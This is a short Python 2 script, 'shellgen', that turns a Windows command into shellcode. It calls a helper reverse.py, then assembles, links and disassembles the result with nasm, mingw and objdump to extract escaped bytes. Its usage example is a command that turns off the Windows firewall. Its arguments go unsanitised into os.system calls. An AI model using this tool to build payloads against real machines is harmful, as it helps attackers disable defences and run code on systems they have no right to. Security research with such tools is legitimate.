#!/usr/bin/env python

import os, sys

if len (sys.argv) != 3:
    print '[!] Insufficient amount of arguments.'
    print '\r\n[*] Execution example: shellgen "netsh advfirewall set allprofiles state off" <name for the file>\r\n'
    sys.exit (1)

os.system("/usr/bin/python /usr/bin/reverse.py " + "'" + sys.argv[1] + "'" + " > " + sys.argv[2] + ".asm")

first = ("/usr/bin/nasm -f win32 -o " + sys.argv[2] + ".o " + sys.argv[2] + ".asm")
os.system(first)

second = ("/usr/bin/i686-w64-mingw32-ld -o " + sys.argv[2] + " " + sys.argv[2] + ".o")
os.system(second)

objdump = ("/usr/bin/objdump -d " + sys.argv[2] + " -M intel")

os.system(objdump)

sed = (' |/usr/bin/sed \'s/^/"/\'|sed \'s/$/"/g\'')

sed = ("/usr/bin/objdump --disassemble=__bss_end__ " + sys.argv[2] + " " + "|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s" + sed)

print '[+] Compiled shellcode:'
os.system(sed)

os.system("/usr/bin/rm " + sys.argv[2] + " " + sys.argv[2] + ".asm " + sys.argv[2] + ".o")
